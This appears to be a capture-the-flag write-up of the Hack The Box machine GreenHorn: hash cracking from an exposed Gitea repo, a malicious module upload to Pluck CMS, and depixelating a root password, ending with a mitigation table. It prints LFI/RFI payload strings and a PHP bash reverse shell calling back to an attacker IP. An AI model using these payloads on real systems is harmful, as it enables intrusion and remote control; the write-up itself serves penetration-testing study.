--- 
title: "Hack the Box (HTB) - GreenHorn"
description: "Hardcoded Creds & Stenography"
date: 2024-12-08 12:00:00 -100
image: /assets/images/HTB - Greenhorn/Greenhorn TN.jpg
categories: [CTF]
tags: [gitea, cms, hashcat, steganography]    # TAG names should always be lowercase
---

## Enumeration

Let's start by running a [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan against our target at `10.10.10.17`

We see the following TCP ports open:

- 22 SSH, OpenSSH 8.9p1 (Ubuntu)
- 80 HTTP, Nginx 1.18.0 (Ubuntu)
- 3000

Let's start with port 80 and navigate to 10.10.10.17

![Port 80](/assets/images/HTB%20-%20Greenhorn/Grrenhorn.htb.png)

This is common on CTF challenges. Virtual hosting allows a server to host multiple websites or domains under a single IP address. This configuration requires specifying which domain you're trying to access.

We must add the entry in our /etc/hosts file to fix this issue so we can resolve locally

```bash
sudo nano /etc/hosts
```

![etc/host](/assets/images/HTB%20-%20Greenhorn/etchosts%20-%20Copy.png)

Now let's navigate back to our page
![Web page](/assets/images/HTB%20-%20Greenhorn/Gree%20horn%20web%20page.png)

We notice the URL has a query parameter `file`

![query parameter](/assets/images/HTB%20-%20Greenhorn/Query%20parameter.png)

Let's try a simple LFI attack `http://greenhorn.htb/?file=../../etc/passwd`

![Hacking Attempt](/assets/images/HTB%20-%20Greenhorn/Hacking%20Atempt.png)

Obviously some security checks are in place, let's head over to burp and see if we can bypass this via intruder

![Intruder](/assets/images/HTB%20-%20Greenhorn/Burp%20Intruder.png)

The LFI attack didn't work, I tried the following:

- URL encoding didn't work (file=%2e%2e%2f%2e%2e%2fetc/passwd)
- Null byte didn't work (file=../../etc/passwd%00)
- Double encoding (file=%252e%252e%252f%252e%252e%252fetc%252fpasswd)
- Unicode encoding (/?file=%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd)
- RFI (http://greenhorn.htb/?file=http://10.10.10.36:9001/test.txt)
- Various XSS attacks
  
Since this box is using virtual hosting (as we discoverd earlier when we couldn't resolve greenhorn.htb) Our ferox directory scan provided by autorecon likely didn't find anything

![gobuster scan](/assets/images/HTB%20-%20Greenhorn/gobuster%20scan.png)

We see `admin.php`, let's investigate

![Pluck Login](/assets/images/HTB%20-%20Greenhorn/pluck%20login.png)

We immediately notice `pluck 4.7.18`. Whenever you see a version number like this, it's a good idea to just searchsploit for exploits

![Exploit Discored](/assets/images/HTB%20-%20Greenhorn/Exploit%20Found.png)

See, easy pickings

This exploit targets a vulnerability in Pluck CMS version 4.7.18, allowing us to upload a zip file containing PHP via the module installation feature. This will obviously give is RCE

However, this exploit requires that we are able to login first

Remember that port on 3000? Let's navigate to it

![Gitea](/assets/images/HTB%20-%20Greenhorn/Gitea.png)

We find the Gitea application, a self-hosted service similar to GitHub that allows you to host and manage your own Git repositories

![GreenAdmin](/assets/images/HTB%20-%20Greenhorn/GreenAdmin.png)

This Greenhorn repo hosted by GreenAdmin reveals the source code to our Pluck application from earlier

![Source Code](/assets/images/HTB%20-%20Greenhorn/Source%20Code.png)

I'm going to look around for some credentials

![Pass](/assets/images/HTB%20-%20Greenhorn/Pass.png)

Sure enough, navigating to `/data/settings/pass.php` reveals what appears to be a SHA-512 hash. Let's try to crack it using `hashcat`

We'll save the hash to a file first, then run the command

```bash
hashcat -m 1700 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![Cracked Hash](/assets/images/HTB%20-%20Greenhorn/Password%20Cracked.png)

The hash was cracked as `iloveyou1`. At least someone loves me, right.

Now let's login to Pluck

![Logged into Pluck](/assets/images/HTB%20-%20Greenhorn/Logged%20into%20Pluck.png)

Let's head over to `options > manage modules > install a module` and upload our malicious zip file

Since we have access to the GUI interface directly. We don't really need that script from earlier. Let's just create our own malicious reverse shell php, zip it, and upload it

First, let's create the PHP script

```php
<?php
system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.36/9001 0>&1'");
?>
```

This tiny php script opens a socket connection from the target server to our machine / port. It then runs a shell on the target server and redirects the input, output, and error to the socket connection (us)

Now let's zip the file

```bash
zip pwned.zip pwned.php
```

Start the NC listener

```bash
nc -lvnp <port>
```

Upload the zipped php file to `options > manage modules > install a module`

Now curl the request

```bash
curl -I http://greenhorn.htb/data/modules/pwned_folder/pwned_file.php
```

We have shell access

![Shell Access](/assets/images/HTB%20-%20Greenhorn/Initial%20Access.png)

We unfortunately can't read the contents of `user.txt` as the file resides in the `junior` folder. We must escalate

## Privilege Escalation

![Escalation to Junior](/assets/images/HTB%20-%20Greenhorn/Escalation%201.png)

And just like that we're junior (Don't reuse passwords!)

## Root Escalation

Let's upgrade this disgusting shell. Typing `which python3` tells us python3 is available on this box. We'll use the following commands to upgrade our terminal

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After spawning the TTY, press Ctrl+Z tp background the shell & in the local terminal, run

```bash
stty raw -echo;fg
```

Once back in the remoter shell, run

```bash
reset
```

Set up the terminal

```bash
export TERM=xterm
```

Now we have a fully interactive shell with auto tab completion, command history and the ability to actually hit backspace

As always let's run sudo -l

![Sudo -l](/assets/images/HTB%20-%20Greenhorn/sudo%20l.png)

User junior `may not run sudo on greenhorn`

We'll have to try something else. Let's get [LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) going and see what we can find

First host the file

```bash
python3 -m http.server 9001
```

wget / curl the request (on the GreenHorn Box)

```bash
wget http://10.10.14.36:9001/linpeas.sh
```

Now we'll run Linpeas and check the results

![Linpeas](/assets/images/HTB%20-%20Greenhorn/Critical%20Finding.png)

We see that the `gitea.service` file is managed by systemd, which is the system service manager. This file specifies the executable `/usr/local/bin/gitea`, which is modifiable by us. By replacing this executable with a reverse shell payload, and then restarting the gitea.service, we can exploit the service's elevated privileges to gain root access.

![Changing $PATH](/assets/images/HTB%20-%20Greenhorn/Changing%20path.png)

### Wrong!

I went down a rabbit hole with that Linpeas. It turns out that we simply needed to take a look at our user folder a bit more

![PDF](/assets/images/HTB%20-%20Greenhorn/PDF.png)

As it turns out it's probably a good idea to check the things that are literally right under your nose 😅

Let's put this pdf onto our attack machine so we can examine it

We'll start up a python web server on the victim machine

```bash
python3 -m http.server 9001
```

Now wget the PDF from our attacker

```bash
wget http://10.10.11.25:8000/'Using OpenVAS.pdf'
```

![PDF Obtained](/assets/images/HTB%20-%20Greenhorn/PDF%20obtained.png)

Let's open the PDF now

![Letter from Mr.Green](/assets/images/HTB%20-%20Greenhorn/Letter%20from%20Mr%20Green.png)

It's a letter from Mr. Green discussing the installation of OpenVAS on the server and that would we have access in the future. The important part is the obfuscated password

This one took some time, but I discovered a tool that can help us read this pixelated password. The tool is [Depix](https://github.com/spipm/Depix)

I won't go into detail on how the tool works, but basically the tool attempts to match pixilated blocks back to their original image by comparing it with a reference image

Download the tool from github and install any dependencies

First we'll quickly need to extract the image from the pdf

```bash
pdfimages -all 'Using OpenVAS.pdf' image
```

![Image Extracted](/assets/images/HTB%20-%20Greenhorn/Image%20taken.png)

Great, now we have the raw image and can proceed with depix

Run the following command as indicated on the github page

```bash
python3 depix.py \
    -p /path/to/your/input/image.png \
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o /path/to/your/output.png
```

![Password](/assets/images/HTB%20-%20Greenhorn/Password%20PNG.png)

We have our file, let's take a look

![Root Password](/assets/images/HTB%20-%20Greenhorn/Root%20Password.png)

We see the text `sidefromsidetheothersidesidefromsidetheotherside`

I was a little dumb here and spent over an hour trying to figure this out. Turns out it's literally the root password

![Root](/assets/images/HTB%20-%20Greenhorn/Root%20Greenhorn.png)

GG, we've rooted Greenhorn!

## Vulnerabilities & Mitigation

| Vulnerability                                    | Mitigation                                                                                       |
|--------------------------------------------------|--------------------------------------------------------------------------------------------------|
| URL Information Disclosure |  Ensure file names are sanitized and not directly exposed in the URL                  |
| Outdated CMS (Pluck) | Keep all software up to date |
| Hardcoded Creds | Do not store credentials in publicly accessible files  |
| Weak password | Use strong passwords |
| Password re-use | Don't reuse passwords |

### Remediation References

[OWASP Top Ten: Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)

[NIST SP 800-63B: Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
